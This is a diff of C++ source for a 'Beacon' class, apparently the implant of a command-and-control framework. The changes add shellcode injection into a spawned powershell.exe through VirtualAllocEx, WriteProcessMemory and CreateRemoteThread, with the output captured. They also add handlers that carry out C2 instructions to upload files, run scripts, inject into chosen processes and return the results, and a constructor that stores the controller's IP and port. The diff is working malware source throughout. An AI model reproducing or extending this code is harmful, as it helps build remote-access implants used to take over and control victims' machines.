@@ -10,13 +10,14 @@
 // windows code goes here
 #endif
 
-#define BUFSIZE 4096 
+#define BUFSIZE 2048 
 
 using namespace std;
 
 
-void execAsembly(const std::string& payload)
+std::string Beacon::execAsembly(const std::string& payload)
 {
+	std::string result;
 
 #ifdef __linux__ 
 
@@ -40,10 +41,8 @@ void execAsembly(const std::string& payload)
 
 	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
 	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
-	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
-	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
 
-	TCHAR szCmdline[] = TEXT("notepad.exe");
+	TCHAR szCmdline[] = TEXT("powershell.exe");
 	PROCESS_INFORMATION piProcInfo;
 	STARTUPINFO siStartInfo;
 	BOOL bSuccess = FALSE;
@@ -53,33 +52,21 @@ void execAsembly(const std::string& payload)
 	siStartInfo.cb = sizeof(STARTUPINFO);
 	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
 	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
-	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
 	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
-	bSuccess = CreateProcess(NULL,
-		szCmdline,     // command line 
-		NULL,          // process security attributes 
-		NULL,          // primary thread security attributes 
-		TRUE,          // handles are inherited 
-		0,             // creation flags 
-		NULL,          // use parent's environment 
-		NULL,          // use parent's current directory 
-		&siStartInfo,  // STARTUPINFO pointer 
-		&piProcInfo);  // receives PROCESS_INFORMATION 
-
-	std::cout << "Injection " << piProcInfo.dwProcessId << std::endl;
-
+	bSuccess = CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
 	int pid = piProcInfo.dwProcessId;
 
 	HANDLE processHandle;
 	HANDLE remoteThread;
 	PVOID remoteBuffer;
 
+	std::cout << "Injection " << piProcInfo.dwProcessId << std::endl;
+
 	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
 	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
 	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	CloseHandle(processHandle);
 
 	if (!bSuccess)
 		std::cout << "CreateProcess" << std::endl;
@@ -91,38 +78,59 @@ void execAsembly(const std::string& payload)
 		CloseHandle(g_hChildStd_IN_Rd);
 	}
 
-	std::cout << "\n->Contents of child process STDOUT:\n\n" << std::endl;
+	COMMTIMEOUTS timeouts = { 0,  0, 10, 0, 0};
+	SetCommTimeouts(g_hChildStd_OUT_Rd, &timeouts);
+
+	int timeOutSec = 60;
+	int idx = 0;
+	while (1)
+	{
+		DWORD threadExitCode;
+		GetExitCodeThread(remoteThread, &threadExitCode);
+		if (threadExitCode != STILL_ACTIVE)
+			break;
+
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+		idx++;
+		if(idx*2> timeOutSec)
+			break;
+	}
 
 	DWORD dwRead, dwWritten;
 	CHAR chBuf[BUFSIZE];
 	bSuccess = FALSE;
-	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-	HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);
+	//HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
 
-	while (1)
+	for (;;)
 	{
 		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
-		if (!bSuccess || dwRead == 0) break;
 
-		bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
-		if (!bSuccess) break;
+		for (int i = 0; i < dwRead; i++)
+			result.push_back(TEXT(chBuf[i]));
 
-		// how to get interactive ???
-		//bSuccess = ReadFile(hParentStdIn, chBuf, BUFSIZE, &dwRead, NULL);
-		//if (!bSuccess || dwRead == 0) break;
+		if (!bSuccess || dwRead == 0) 
+			break;
 
-		//bSuccess = WriteFile(g_hChildStd_IN_Rd, chBuf, BUFSIZE, &dwRead, NULL);
-		//if (!bSuccess || dwRead == 0) break;
+		//bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
+		//if (!bSuccess) 
+		//	break;
 	}
+
+	TerminateProcess(processHandle, 0);
+	CloseHandle(piProcInfo.hProcess);
+	CloseHandle(piProcInfo.hThread);
+	CloseHandle(g_hChildStd_OUT_Wr);
+	CloseHandle(g_hChildStd_IN_Rd);
 
 #endif
 
-	return;
+	return result;
 }
 
 
-int inject(int pid, const std::string& payload)
+std::string Beacon::inject(int pid, const std::string& payload)
 {
+	std::string result;
 
 #ifdef __linux__ 
 
@@ -177,11 +185,11 @@ int inject(int pid, const std::string& payload)
 
 #endif
 
-	return 0;
+	return result;
 }
 
 
-std::string execBash(const string& cmd)
+std::string Beacon::execBash(const string& cmd)
 {
 	std::string result;
 
@@ -215,13 +223,14 @@ std::string execBash(const string& cmd)
 
 #endif
 
-
 	return result;
 }
 
 
-Beacon::Beacon()
+Beacon::Beacon(std::string& ip, int port)
 {
+	m_ip = ip;
+	m_port = port;
 
 }
 
@@ -239,10 +248,9 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 	if (instruction == "upload")
 	{
 		std::string outputFile = c2Message.outputfile();
+		std::ofstream output(outputFile, std::ios::binary);
 
 		const std::string buffer = c2Message.data();
-
-		std::ofstream output(outputFile, std::ios::binary);
 		output << buffer;
 		output.close();
 	}
@@ -250,27 +258,27 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 	{
 		const std::string buffer = c2Message.data();
 
-		execAsembly(buffer);
+		std::string outCmd = execAsembly(buffer);
+
+		c2RetMessage.set_instruction(instruction);
+		c2RetMessage.set_returnvalue(outCmd);
 	}
 	else if (instruction == "script")
 	{
 		const std::string buffer = c2Message.data();
 
-		std::string totalOutCmd = execBash(buffer);
+		std::string outCmd = execBash(buffer);
 
 		c2RetMessage.set_instruction(instruction);
-		c2RetMessage.set_returnvalue(totalOutCmd);
+		c2RetMessage.set_returnvalue(outCmd);
 	}
 	else if (instruction == "inject")
 	{
 		const std::string buffer = c2Message.data();
 		int pid = c2Message.pidinjection();
 
-		std::unique_ptr<std::thread> threadExec(new std::thread(inject, pid, buffer));
+		std::unique_ptr<std::thread> threadExec(new std::thread(&Beacon::inject, this, pid, buffer));
 		m_threadsExec.push_back(std::move(threadExec));
-
-		//			std::thread(inject, pid, buffer);
-		//			inject(pid, buffer);
 	}
 	else if (instruction == "run")
 	{
